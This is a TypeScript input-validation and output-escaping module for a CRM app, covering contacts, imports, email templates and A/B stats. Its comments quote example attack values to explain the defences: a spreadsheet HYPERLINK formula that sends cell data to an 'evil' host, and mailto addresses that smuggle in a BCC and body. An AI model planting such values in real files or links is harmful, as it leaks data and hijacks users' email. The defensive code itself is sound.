// Shared input validation for both write entry points: the session-based route
// action (app/routes/home.tsx) and the machine API (app/routes/api.hyperagent.ts).
//
// Before this module the two disagreed about what was acceptable — the machine
// API checked `status` against a whitelist while the session action wrote any
// string it was handed. Everything that validates a CRM write now lives here so
// the two can't drift again.
//
// Isomorphic on purpose (no `.server` suffix): the client uses the same limits
// for `maxLength` attributes and the CSV import preview, so the browser and the
// server agree on what will be rejected.

import { CH, OWNERS, STATUSES } from "../crm/data";
import {
  TEMPLATE_STATUSES,
  VARIANT_SLOTS,
  type TemplateStatus,
  type VariantSlot,
} from "../crm/templates";

/**
 * Per-field maximum lengths, in characters, applied after trimming. Generous
 * enough never to bite a real contact (320 is the RFC 5321 maximum for an email
 * address) but bounded so a single field can't carry a megabyte into D1.
 */
export const LIMITS = {
  name: 200,
  company: 200,
  email: 320,
  phone: 60,
  linkedin: 500,
  source: 200,
  status: 60,
  note: 5_000,
  // Email templates. `body` is twice `note` because an email body is not a CRM
  // note — a real cold intro with merge tokens runs long, and truncating one at
  // 5k would silently mangle the copy someone is about to send.
  templateName: 120,
  subject: 300,
  body: 10_000,
} as const;

/** Maximum rows accepted in one CSV / API import. */
export const MAX_IMPORT_ROWS = 2_000;

/** Maximum ids accepted by a bulk operation (delete, mark-ads-sent). */
export const MAX_IDS = 1_000;

/** Maximum size of an uploaded CSV file, in bytes. */
export const MAX_CSV_BYTES = 2 * 1024 * 1024;

/**
 * Largest counter a sender may push for one template variant. Ten million sends
 * would be a bug in the sending tool, not a campaign — and an unbounded integer
 * here feeds straight into the z-test, where a garbage denominator produces a
 * confident, wrong verdict.
 */
export const MAX_STAT_COUNT = 10_000_000;

/** Furthest day of a sequence a template may be scheduled on. */
export const MAX_SEND_DAY = 365;

/**
 * Why a deal died, offered when a contact's status is set to Dead. A closed set
 * rather than free text: the analytics panel groups on this value exactly, and a
 * typo would silently become its own bucket. The client imports it to render the
 * picker, so both ends offer and accept the same five.
 */
export const DEAD_REASONS = [
  "No response",
  "Not a fit",
  "Timing",
  "Price",
  "Competitor",
] as const;

const STATUS_IDS: ReadonlySet<string> = new Set(STATUSES.map((s) => s.id));
const TOUCH_TYPES: ReadonlySet<string> = new Set(Object.keys(CH));
const DEAD_REASON_SET: ReadonlySet<string> = new Set(DEAD_REASONS);
const TEMPLATE_STATUS_SET: ReadonlySet<string> = new Set(TEMPLATE_STATUSES);
const VARIANT_SLOT_SET: ReadonlySet<string> = new Set(VARIANT_SLOTS);

export function isValidStatus(value: unknown): value is string {
  return typeof value === "string" && STATUS_IDS.has(value);
}

export function isValidTouchType(value: unknown): value is string {
  return typeof value === "string" && TOUCH_TYPES.has(value);
}

export function isValidDeadReason(value: unknown): value is string {
  return typeof value === "string" && DEAD_REASON_SET.has(value);
}

export function isValidTemplateStatus(value: unknown): value is TemplateStatus {
  return typeof value === "string" && TEMPLATE_STATUS_SET.has(value);
}

export function isValidVariantSlot(value: unknown): value is VariantSlot {
  return typeof value === "string" && VARIANT_SLOT_SET.has(value);
}

/** Loop numbers are a closed set of two; anything else is a bug or an attack. */
export function isValidLoop(value: unknown): value is number {
  return value === 1 || value === 2;
}

/**
 * Owners are looked up as `OWNERS[name]` in the UI, so an arbitrary string here
 * would reach a prototype-chain property (`"constructor"` returns a function,
 * not undefined). `Object.hasOwn` keeps the lookup to real own keys.
 */
export function isValidOwner(value: unknown): value is string {
  return typeof value === "string" && Object.hasOwn(OWNERS, value);
}

/**
 * Coerce an unknown value to a trimmed string. Non-strings become "" rather
 * than throwing — several call sites previously did `.trim()` straight on a
 * JSON-parsed value, which threw a TypeError when a caller sent a number.
 */
export function asString(value: unknown): string {
  return typeof value === "string" ? value.trim() : "";
}

/** True when `value` is a string that fits within `max` after trimming. */
export function fits(value: unknown, max: number): boolean {
  return asString(value).length <= max;
}

// Deliberately permissive about what an address may contain — this rejects the
// obviously malformed (spaces, no @, no dot in the domain) without trying to
// out-guess RFC 5322. The allowlist, not this regex, decides who may sign in.
//
// The excluded set does include the URL-significant characters `? & = # % /`,
// which real addresses never carry. That is load-bearing for safeMailto(): an
// address ending `?subject=…&body=…` is otherwise well-formed enough to pass a
// naive check, and would then prefill an attacker-controlled draft in the user's
// mail client. Excluding a second `@` is not sufficient — that only catches the
// `?bcc=someone@evil.com` shape, not `?subject=x&body=y`.
const EMAIL_CHAR = `[^\\s@,;:<>"'()\\[\\]\\\\?&=#%/]`;
const EMAIL_RE = new RegExp(`^${EMAIL_CHAR}+@${EMAIL_CHAR}+\\.${EMAIL_CHAR}+$`);

export function isValidEmail(value: unknown): boolean {
  const s = asString(value);
  return s.length > 0 && s.length <= LIMITS.email && EMAIL_RE.test(s);
}

export type ContactFields = {
  name: string;
  company: string;
  email: string | null;
  phone: string | null;
  linkedin: string | null;
  loops: number[] | undefined;
  owner: string | null;
  status: string;
  source: string | null;
};

export type ValidationResult =
  | { ok: true; value: ContactFields }
  | { ok: false; error: string };

/**
 * Validate and normalize one contact from either entry point. Accepts `unknown`
 * for every field because both callers receive untrusted input (FormData values
 * on one side, `JSON.parse` output on the other) — nothing here may assume a
 * string arrived.
 *
 * Unknown `owner` / `status` values are rejected rather than silently dropped:
 * a caller sending "Bretton" wants to know it didn't stick, and silently writing
 * NULL would let a typo escape the owner filter and the cross-owner conflict
 * check without any signal.
 */
export function validateContact(raw: unknown): ValidationResult {
  const r = (raw ?? {}) as Record<string, unknown>;

  const name = asString(r.name);
  if (!name) return { ok: false, error: "Name is required." };
  if (name.length > LIMITS.name) {
    return { ok: false, error: `Name must be ${LIMITS.name} characters or fewer.` };
  }

  const company = asString(r.company);
  if (company.length > LIMITS.company) {
    return { ok: false, error: `Company must be ${LIMITS.company} characters or fewer.` };
  }

  const email = asString(r.email);
  if (email && !isValidEmail(email)) {
    return { ok: false, error: `"${truncateForMessage(email)}" is not a valid email address.` };
  }

  const phone = asString(r.phone);
  if (phone.length > LIMITS.phone) {
    return { ok: false, error: `Phone must be ${LIMITS.phone} characters or fewer.` };
  }

  const linkedin = asString(r.linkedin);
  if (linkedin.length > LIMITS.linkedin) {
    return { ok: false, error: `LinkedIn must be ${LIMITS.linkedin} characters or fewer.` };
  }

  const source = asString(r.source);
  if (source.length > LIMITS.source) {
    return { ok: false, error: `Source must be ${LIMITS.source} characters or fewer.` };
  }

  // Empty/absent status means "use the default", which matches the previous
  // `form.get("status") || "New"` behaviour.
  const rawStatus = asString(r.status);
  const status = rawStatus || "New";
  if (!isValidStatus(status)) {
    return { ok: false, error: `Unknown status "${truncateForMessage(rawStatus)}".` };
  }

  // "Unassigned" is the sentinel the add-contact form's select submits.
  const rawOwner = asString(r.owner);
  const ownerGiven = rawOwner && rawOwner !== "Unassigned";
  if (ownerGiven && !isValidOwner(rawOwner)) {
    return { ok: false, error: `Unknown owner "${truncateForMessage(rawOwner)}".` };
  }

  let loops: number[] | undefined;
  if (r.loops !== undefined && r.loops !== null) {
    if (!Array.isArray(r.loops)) {
      return { ok: false, error: "Loops must be an array." };
    }
    const parsed = r.loops.map(Number).filter(isValidLoop);
    // An array that was present but contained nothing usable is a caller error,
    // not a request for the default.
    if (!parsed.length) return { ok: false, error: "Loops must contain 1 or 2." };
    loops = [...new Set(parsed)].sort();
  }

  return {
    ok: true,
    value: {
      name,
      company,
      email: email || null,
      phone: phone || null,
      linkedin: linkedin || null,
      loops,
      owner: ownerGiven ? rawOwner : null,
      status,
      source: source || null,
    },
  };
}

/**
 * Validate a batch of imported rows. Invalid rows are skipped rather than
 * failing the whole import — a 500-row CSV with three bad addresses should
 * still land the other 497 — but the count and the first reason come back so
 * the UI can say what was dropped.
 */
export function validateImportRows(raw: unknown):
  | { ok: true; rows: ContactFields[]; skipped: number; firstError: string | null }
  | { ok: false; error: string } {
  if (!Array.isArray(raw)) {
    return { ok: false, error: "Imported rows must be an array." };
  }
  if (raw.length > MAX_IMPORT_ROWS) {
    return {
      ok: false,
      error: `Too many rows: ${raw.length}. The maximum per import is ${MAX_IMPORT_ROWS}.`,
    };
  }

  const rows: ContactFields[] = [];
  let skipped = 0;
  let firstError: string | null = null;

  for (const row of raw) {
    const result = validateContact(row);
    if (result.ok) {
      rows.push(result.value);
    } else {
      skipped++;
      if (!firstError) firstError = result.error;
    }
  }

  if (!rows.length) {
    return { ok: false, error: firstError ?? "No valid contacts to import." };
  }
  return { ok: true, rows, skipped, firstError };
}

/**
 * Validate a bulk id list. Ids are opaque to us (they're `crypto.randomUUID()`
 * output), so this bounds the count and drops non-strings rather than checking
 * a format — a wrong-but-well-formed id simply matches no row.
 */
export function validateIds(raw: unknown):
  | { ok: true; ids: string[] }
  | { ok: false; error: string } {
  if (!Array.isArray(raw)) return { ok: false, error: "Expected a list of contacts." };
  if (!raw.length) return { ok: false, error: "No contacts selected." };
  if (raw.length > MAX_IDS) {
    return {
      ok: false,
      error: `Too many contacts selected: ${raw.length}. The maximum is ${MAX_IDS}.`,
    };
  }
  const ids = [...new Set(raw.filter((id): id is string => typeof id === "string" && !!id))];
  if (!ids.length) return { ok: false, error: "No contacts selected." };
  return { ok: true, ids };
}

/** Bound a free-text note. Returns null when empty. */
export function validateNote(raw: unknown):
  | { ok: true; text: string }
  | { ok: false; error: string } {
  const text = asString(raw);
  if (!text) return { ok: false, error: "Note text is required." };
  if (text.length > LIMITS.note) {
    return { ok: false, error: `Notes must be ${LIMITS.note} characters or fewer.` };
  }
  return { ok: true, text };
}

/** Keep an echoed-back bad value short so an error message can't be a payload. */
function truncateForMessage(value: string): string {
  return value.length > 40 ? value.slice(0, 40) + "…" : value;
}

// ---------------------------------------------------------------------------
// Email templates
// ---------------------------------------------------------------------------

export type TemplateFields = { name: string; loop: number; sendDay: number };

/**
 * Validate a template's settings (name, loop, which day of the sequence it goes
 * out on). Mirrors validateContact: accepts `unknown` for every field because
 * both entry points hand over untrusted input.
 *
 * The *create* path does not call this — "+ New" writes the `UNTITLED` constant
 * and the defaults, so a name is only ever required once someone edits it.
 */
export function validateTemplate(raw: unknown):
  | { ok: true; value: TemplateFields }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const name = asString(r.name);
  if (!name) return { ok: false, error: "Template name is required." };
  if (name.length > LIMITS.templateName) {
    return {
      ok: false,
      error: `Template name must be ${LIMITS.templateName} characters or fewer.`,
    };
  }

  // Absent means "the default" — Loop 1, the always-on sequence.
  const rawLoop = r.loop;
  const loop = rawLoop === undefined || rawLoop === null || rawLoop === "" ? 1 : Number(rawLoop);
  if (!isValidLoop(loop)) return { ok: false, error: "Loop must be 1 or 2." };

  const rawSendDay = r.sendDay;
  const sendDay =
    rawSendDay === undefined || rawSendDay === null || rawSendDay === ""
      ? 0
      : Number(rawSendDay);
  if (!Number.isInteger(sendDay) || sendDay < 0 || sendDay > MAX_SEND_DAY) {
    return {
      ok: false,
      error: `Send day must be a whole number between 0 and ${MAX_SEND_DAY}.`,
    };
  }

  return { ok: true, value: { name, loop, sendDay } };
}

/**
 * Validate one variant's copy.
 *
 * Both fields may be **empty**: a draft in progress has to be savable, and the
 * page renders a placeholder for each. Only over-length is an error.
 *
 * No sanitisation of the `{{first_name}}` / `{{company}}` / `{{sender}}` merge
 * tokens, and none is wanted: the copy is stored verbatim and rendered as a text
 * node, never as HTML and never interpolated. If a future feature does start
 * substituting them, the escaping belongs at that point of use, not here.
 */
export function validateVariantContent(raw: unknown):
  | { ok: true; value: { subject: string; body: string } }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const subject = asString(r.subject);
  if (subject.length > LIMITS.subject) {
    return { ok: false, error: `Subject must be ${LIMITS.subject} characters or fewer.` };
  }

  const body = asString(r.body);
  if (body.length > LIMITS.body) {
    return { ok: false, error: `Body must be ${LIMITS.body} characters or fewer.` };
  }

  return { ok: true, value: { subject, body } };
}

/**
 * One pushed counter set. `null` means "leave this column alone" — see
 * validateStats for why that is not the same as zero.
 */
export type StatCounts = {
  sends: number | null;
  opens: number | null;
  replies: number | null;
  meetings: number | null;
};

const STAT_KEYS = ["sends", "opens", "replies", "meetings"] as const;

/**
 * Validate a stats push. Every field is optional, and absent (`undefined`,
 * `null` or `""`) maps to `null`, which recordVariantStats() COALESCEs into "keep
 * the stored value".
 *
 * That distinction is load-bearing: `Number("")` is `0`, so coercing blindly
 * would let a caller that mentions only `replies` silently zero the other three
 * counters — and since the verdict is computed from them, that reads as a real
 * change in performance rather than a bug.
 *
 * No cross-field validation (`opens <= sends`, `replies <= opens`). Pixel-blocking
 * makes `replies > opens` genuinely common, and partial pushes arrive out of
 * order, so those inequalities are false in the real world often enough that
 * enforcing them would reject correct data.
 */
export function validateStats(raw: unknown):
  | { ok: true; value: StatCounts }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;
  const value: StatCounts = { sends: null, opens: null, replies: null, meetings: null };
  let given = 0;

  for (const key of STAT_KEYS) {
    const rawValue = r[key];
    if (rawValue === undefined || rawValue === null || rawValue === "") continue;
    const n = Number(typeof rawValue === "string" ? rawValue.trim() : rawValue);
    if (!Number.isInteger(n) || n < 0 || n > MAX_STAT_COUNT) {
      const shown = truncateForMessage(String(rawValue));
      return {
        ok: false,
        error: `"${shown}" is not a whole number between 0 and ${MAX_STAT_COUNT}.`,
      };
    }
    value[key] = n;
    given++;
  }

  if (!given) return { ok: false, error: "Nothing to record." };
  return { ok: true, value };
}

/**
 * Resolve which variant a write targets: an opaque `variantId`, or the stable
 * `slot` ("A"/"B") within a template.
 *
 * The slot form exists for the machine caller — it can store one id per template
 * and keep pushing to "B" even if B is added long after it was configured. It is
 * unambiguous because of the unique (template_id, slot) index.
 *
 * Shared by the form action and /api/hyperagent so the two can't drift, which is
 * the entire reason this module exists.
 */
export function validateVariantTarget(raw: unknown):
  | { ok: true; value: { templateId: string; variantId?: string; slot?: string } }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const templateId = asString(r.templateId);
  if (!templateId) return { ok: false, error: "Missing template id." };

  const variantId = asString(r.variantId);
  const slot = asString(r.slot);

  if (variantId && slot) {
    return { ok: false, error: "Give either a variant id or a slot, not both." };
  }
  if (variantId) return { ok: true, value: { templateId, variantId } };
  if (slot) {
    if (!isValidVariantSlot(slot)) {
      return { ok: false, error: `Unknown variant "${truncateForMessage(slot)}".` };
    }
    return { ok: true, value: { templateId, slot } };
  }
  return { ok: false, error: "Missing variant id or slot." };
}

// ---------------------------------------------------------------------------
// Output escaping
// ---------------------------------------------------------------------------

/**
 * Escape one CSV cell.
 *
 * Two separate jobs: RFC 4180 quoting (commas, quotes, newlines), and *formula
 * injection*. Excel and Google Sheets execute a cell beginning with `=`, `+`,
 * `-`, `@`, tab or CR, so an exported contact named
 * `=HYPERLINK("https://evil/"&A1,"Click")` runs on open. Prefixing with an
 * apostrophe forces the spreadsheet to treat it as literal text.
 */
export function csvCell(value: string): string {
  const raw = value ?? "";
  const neutralized = /^[=+\-@\t\r]/.test(raw) ? "'" + raw : raw;
  // Tabs are quoted alongside the RFC 4180 set because this app's own CSV
  // importer splits on /[,\t]/ — an unquoted tab would re-import into the wrong
  // column.
  return /[",\n\r\t]/.test(neutralized)
    ? '"' + neutralized.replace(/"/g, '""') + '"'
    : neutralized;
}

/**
 * Build a `mailto:` href from a stored address.
 *
 * A raw address is interpolated straight into the URL by the detail panel, so
 * `victim@corp.com?bcc=attacker@evil.com&body=…` would prefill an
 * attacker-controlled BCC and body in the user's mail client. Anything that
 * isn't a plain valid address gets no link at all.
 */
export function safeMailto(email: string): string | null {
  const s = asString(email);
  if (!isValidEmail(s)) return null;
  // Safe to interpolate directly: isValidEmail rejects whitespace and every
  // character with meaning in a URL (`? & = # % /`), which is exactly the set an
  // injected header would need. Percent-encoding on top of that would only
  // mangle legitimate addresses — `jane+crm@acme.co.uk` would become
  // `jane%2Bcrm@…`, which not every mail client decodes back.
  return "mailto:" + s;
}
